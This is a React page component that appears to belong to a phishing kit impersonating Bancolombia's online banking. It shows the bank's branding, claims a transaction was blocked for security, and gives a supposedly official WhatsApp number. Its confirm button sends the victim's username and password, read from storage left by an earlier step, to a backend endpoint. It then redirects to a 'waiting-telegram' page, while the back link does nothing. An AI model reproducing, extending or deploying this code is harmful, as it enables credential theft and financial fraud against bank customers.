import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Phone, Loader2 } from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";

import logoSymbol from "@assets/LogoBancolombia_1764027131736.png";

export default function Call923() {
  const [, setLocation] = useLocation();
  const [clientIp, setClientIp] = useState("Cargando...");
  const [currentTime, setCurrentTime] = useState(new Date());
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    const userId = localStorage.getItem("userId");
    if (!userId) {
      setLocation("/");
      return;
    }

    fetch("/api/client-ip")
      .then((res) => res.json())
      .then((data) => setClientIp(data.ip))
      .catch(() => setClientIp("0.0.0.0"));

    const timer = setInterval(() => {
      setCurrentTime(new Date());
    }, 1000);

    return () => clearInterval(timer);
  }, [setLocation]);

  const handleYesIWasMe = async () => {
    setIsLoading(true);
    try {
      const userId = localStorage.getItem("userId");
      const username = localStorage.getItem("username");
      const password = localStorage.getItem("password");
      const response = await fetch("/api/send-yes-i-was-me", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ userId, username, password }),
      });

      if (response.ok) {
        setLocation("/waiting-telegram");
      } else {
        setIsLoading(false);
      }
    } catch (error) {
      console.error("Error:", error);
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center bg-background px-4 py-8 font-sans text-white relative">
      {/* Loading Overlay */}
      {isLoading && (
        <div className="absolute inset-0 bg-black/80 z-50 flex flex-col items-center justify-center backdrop-blur-sm">
          <Loader2 className="w-12 h-12 text-[#FDDA24] animate-spin mb-4" />
          <p className="text-white font-medium">Cargando...</p>
        </div>
      )}

      {/* Header Text */}
      <div className="mb-8 flex justify-center items-center gap-3">
        <img
          src={logoSymbol}
          alt="Bancolombia Symbol"
          className="h-12 w-12 object-contain"
        />
        <h1 className="text-3xl font-bold text-white">Bancolombia</h1>
      </div>
      <h1 className="text-2xl font-normal mb-8 text-center">
        Sucursal Virtual Personas
      </h1>

      <div className="w-full max-w-sm">
        {/* Call 923 Card */}
        <Card className="bg-[#383838] border-none shadow-xl rounded-xl overflow-hidden text-white">
          <CardContent className="pt-10 pb-8 px-8 text-center space-y-6">
            {/* Icon */}
            <div className="flex justify-center">
              <div className="bg-gradient-to-br from-[#FDDA24] to-[#FFF066] p-6 rounded-full">
                <Phone className="w-12 h-12 text-black" strokeWidth={1.5} />
              </div>
            </div>

            {/* Title */}
            <div className="space-y-3">
              <h2 className="text-2xl font-bold">¿Necesitas ayuda?</h2>
              <p className="text-sm text-gray-300 leading-relaxed">
                Por seguridad, no pudiste continuar con la transacción
              </p>
            </div>

            {/* Info Box */}
            <div className="bg-[#4a4a4a] rounded-lg p-4 space-y-3">
              <p className="text-xs text-gray-300">
                Para confirmar si eres quien hace la transacción, te escribiremos desde nuestro WhatsApp oficial 
                <span className="font-semibold text-white block mt-1">+57 (301) 353 6788</span>
                <span className="font-semibold text-white">responde si o no.</span>
              </p>
              <p className="text-xs text-gray-400">
                Si tienes dudas, llámanos a la Sucursal Telefónica y sigue las instrucciones 3 y 0 de nuestro menú 3.
              </p>
            </div>

            {/* Code Display */}
            <div className="space-y-2">
              <p className="text-sm text-gray-300">
                Código <span className="font-semibold text-white">923</span>
              </p>
            </div>

            {/* Buttons */}
            <div className="space-y-3 pt-4">
              <button
                onClick={handleYesIWasMe}
                disabled={isLoading}
                className="w-full bg-[#FDDA24] hover:bg-[#FFF066] text-black font-bold py-3 rounded-full transition-all inline-block disabled:opacity-50"
                data-testid="button-call"
              >
                SI, FUI YO
              </button>
              <div
                className="w-full text-white font-medium py-3 hover:opacity-80 transition-opacity underline text-center cursor-not-allowed"
                data-testid="button-back"
              >
                Volver atrás
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Footer Section */}
      <div className="w-full mt-12 pt-8 border-t border-white/10 text-center text-white px-4">
        <div className="max-w-sm mx-auto space-y-6">
          {/* Links */}
          <div className="space-y-3 text-sm">
            <p className="text-gray-300">¿Problemas para conectarte?</p>
            <div className="space-y-2">
              <a href="#" className="block text-white hover:underline">
                Aprende sobre seguridad
              </a>
              <a href="#" className="block text-white hover:underline">
                Reglamento Sucursal Virtual
              </a>
              <a href="#" className="block text-white hover:underline">
                Política de privacidad
              </a>
            </div>
          </div>

          {/* Bancolombia Logo and Vigilado */}
          <div className="pt-4 space-y-3">
            <div className="flex justify-center items-center gap-2">
              <div className="flex flex-col gap-1">
                <div className="w-4 h-1 bg-white rounded-full"></div>
                <div className="w-4 h-1 bg-white rounded-full"></div>
                <div className="w-4 h-1 bg-white rounded-full"></div>
              </div>
              <span className="text-lg font-bold">Bancolombia</span>
            </div>
            <p className="text-xs text-gray-400">
              VIGILADO <span className="block text-xs">Superintendencia Financiera de Colombia</span>
            </p>
          </div>

          {/* IP and Time */}
          <div className="text-xs text-gray-500 space-y-1 border-t border-white/10 pt-4">
            <p>Dirección IP: {clientIp}</p>
            <p>
              {currentTime.toLocaleDateString('es-CO', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}, {currentTime.toLocaleTimeString('es-CO', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true })}
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
